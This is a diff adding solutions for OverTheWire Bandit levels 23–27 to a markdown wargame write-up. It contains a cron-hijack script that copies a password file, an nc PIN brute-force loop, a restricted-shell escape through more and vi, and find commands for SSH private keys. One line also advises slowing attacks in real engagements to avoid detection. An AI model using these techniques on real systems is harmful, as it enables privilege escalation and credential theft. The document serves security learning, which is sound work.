@@ -665,3 +665,103 @@ find / -name "*.log" 2>/dev/null     # log files
 find / -name "id_rsa" 2>/dev/null    # SSH private keys
 find / -writable -type f 2>/dev/null # files you can write to
 ```
+
+----
+
+## Level 23 → 24
+
+**Goal:** Get the password by exploiting a cron job that executes scripts from a world-writable directory.
+
+**Tricky:** You can't modify the cron script, but you can drop your own script into the directory it executes. Since there's no interactive terminal, you need to redirect output to a file you can read later.
+
+**Solution:**
+
+`cat /etc/cron.d/cronjob_bandit24` — see what runs and when
+
+`cat /usr/bin/cronjob_bandit24.sh` — read the actual script
+
+`mkdir /tmp/yourfolder`
+
+`nano /tmp/yourfolder/myscript.sh`
+
+Script contents:
+
+```bash
+#!/bin/bash
+cp /etc/bandit_pass/bandit24 /tmp/yourfolder/pass.txt
+chmod 777 /tmp/yourfolder/pass.txt
+```
+
+`chmod 777 /tmp/yourfolder/myscript.sh`
+
+`chmod 777 /tmp/yourfolder`
+
+`cp /tmp/yourfolder/myscript.sh /var/spool/bandit24/foo/`
+
+Wait like 30 secs, then: `cat /tmp/yourfolder/pass.txt`
+
+**Key concept — Cron Job Hijacking:** If a cron job executes files from a directory you can write to, you can inject your own code. As blue team: audit permissions of directories used by cron jobs.
+
+---
+
+## Level 24 → 25
+
+**Goal:** Connect to a daemon on port 30002 that requires bandit24's password + a 4-digit PIN (0000–9999).
+
+**Tricky:** That's 10,000 combinations. The server keeps the connection open between attempts, so you can send everything in one shot using a loop.
+
+**Solution:**
+
+```bash
+{ for i in $(seq 0 9999); do echo "BANDIT24_PASSWORD $i"; done } | nc localhost 30002
+```
+
+**Key concept — Brute Force:** Automating combinations against a network service. In real engagements, add `sleep` between attempts to avoid detection (low and slow attack). As blue team: implement rate limiting and lockout after N failed attempts.
+
+---
+
+## Level 25 → 26
+
+**Goal:** Log in as bandit26 using an SSH key, knowing their shell is not `/bin/bash`.
+
+**Tricky:** bandit26's shell is a script that uses `more` to display a file and then closes the session. Just like Level 13→14, SSH from inside the server is blocked — you must connect from your local machine.
+
+**Solution:**
+
+`cat /etc/passwd | grep bandit26` — check bandit26's shell
+
+From your local machine:
+
+`scp -P 2220 bandit25@bandit.labs.overthewire.org:/home/bandit25/bandit26.sshkey ~/`
+
+Shrink your terminal to minimum height (4-5 lines) — this is critical
+
+`ssh -i ~/bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220`
+
+**Key concept — Restricted Shell:** Not every user has `/bin/bash`. Each user's shell is defined in `/etc/passwd` (last field). A non-standard shell can limit or completely block access.
+
+---
+
+## Level 26 → 27
+
+**Goal:** Escape bandit26's restricted shell and get bandit27's password.
+
+**Tricky:** The shell uses `more` which, with a minimized terminal, enters interactive mode. From `more` you can open `vi`, and from `vi` you can execute bash.
+
+**Solution:**
+
+With terminal minimized, when `more` pauses:
+
+`v` — open vi from more
+
+`:set shell=/bin/bash` — change the shell inside vi
+
+`:shell` — execute bash → successful jailbreak
+
+Now inside as bandit26:
+
+`./bandit27-do cat /etc/bandit_pass/bandit27` — use the SUID binary
+
+**Key concept — Shell Escape + SUID:** Escaping restricted shells via text editors is a classic technique (also works with `vim`, `less`, `man`). SUID allows running a binary with its owner's permissions, not the caller's.
+
+**Personal note:** Seriously, who designed this, WHY? IN WHAT WORLD WOULD YOU NEED THIS?
